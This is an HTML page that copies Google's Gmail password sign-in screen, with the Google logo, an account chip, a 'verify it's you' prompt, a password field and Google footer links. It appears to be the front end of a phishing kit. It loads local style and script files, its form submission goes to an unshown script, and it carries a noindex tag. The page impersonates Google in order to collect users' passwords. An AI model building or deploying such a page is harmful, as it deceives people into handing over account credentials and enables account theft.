<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description"
        content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
    <meta name="robots" content="noindex, nofollow">
    <title>Gmail</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_16dp.png"
        type="image/png">
    <link rel="stylesheet" href="styles.css">
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Google+Sans+Text:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
        rel="stylesheet">
</head>

<body class="page-password">
    <div class="outer">
        <div class="card">
            <div class="pw-header">
                <div class="g-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48"
                        aria-hidden="true">
                        <path fill="#4285F4"
                            d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z" />
                        <path fill="#34A853"
                            d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z" />
                        <path fill="#FABB05"
                            d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z" />
                        <path fill="#E94235"
                            d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z" />
                    </svg>
                </div>
                <h1 class="heading">Welcome</h1>

                <!-- Email chip with dropdown -->
                <div class="chip-wrap" id="chipWrap">
                    <div class="id-chip" id="userChip">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
                            fill="#5f6368">
                            <path
                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                        </svg>
                        <span class="id-chip-text" id="chipEmail">user@gmail.com</span>
                        <svg class="id-chip-arrow" id="chipArrow" xmlns="http://www.w3.org/2000/svg" width="18"
                            height="18" viewBox="0 0 24 24" fill="#5f6368">
                            <path d="M7 10l5 5 5-5z" />
                        </svg>
                    </div>

                    <!-- Account picker dropdown -->
                    <div class="chip-dropdown" id="chipDropdown">
                        <div class="chip-dropdown-list" id="chipDropdownList">
                            <!-- Accounts injected by JS -->
                        </div>
                        <a href="/" class="chip-dropdown-row chip-dropdown-add">
                            <div class="account-avatar account-avatar-add">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
                                    fill="none" stroke="#5f6368" stroke-width="1.5">
                                    <circle cx="12" cy="8" r="4" />
                                    <path d="M4 20c0-3.31 3.58-6 8-6s8 2.69 8 6" />
                                </svg>
                            </div>
                            <span class="chip-dropdown-name">Use another account</span>
                        </a>
                    </div>
                </div>
            </div>

            <div class="pw-verify-text">
                To continue, first verify it's you
            </div>

            <form id="passwordForm" class="pw-form" novalidate>
                <div class="field-wrap" id="pwWrap" style="margin-top:0">
                    <div class="field pw-field" id="pwField">
                        <input type="password" id="passwordInput" class="field-input" placeholder=" " autofocus
                            aria-label="Enter your password" name="Passwd" dir="ltr" spellcheck="false"
                            autocomplete="current-password" />
                        <label for="passwordInput" class="field-label">Enter your password</label>
                    </div>
                </div>
                <div class="err" id="pwErr">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                        fill="#d93025">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                    <span>Enter a password</span>
                </div>

                <div class="show-pw">
                    <input type="checkbox" id="showPwCheck">
                    <label for="showPwCheck">Show password</label>
                </div>

                <div class="btn-row">
                    <a href="https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin" class="link forgot-link" style="margin-top:0">Forgot password?</a>
                    <button type="submit" class="btn-blue">Next</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Overlay for closing dropdown -->
    <div class="chip-overlay" id="chipOverlay"></div>

    <footer class="gfoot">
        <div class="gfoot-inner">
            <div class="gfoot-lang">
                <select aria-label="Change language">
                    <option selected>English (United States)</option>
                    <option>हिन्दी</option>
                    <option>বাংলা</option>
                    <option>తెలుగు</option>
                    <option>मराठी</option>
                    <option>தமிழ்</option>
                    <option>ગুજરાતી</option>
                    <option>ಕನ್ನಡ</option>
                    <option>മലയാളം</option>
                    <option>ਪੰਜਾਬੀ</option>
                </select>
            </div>
            <div class="gfoot-links">
                <a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a>
                <a href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">Privacy</a>
                <a href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">Terms</a>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>

</html>
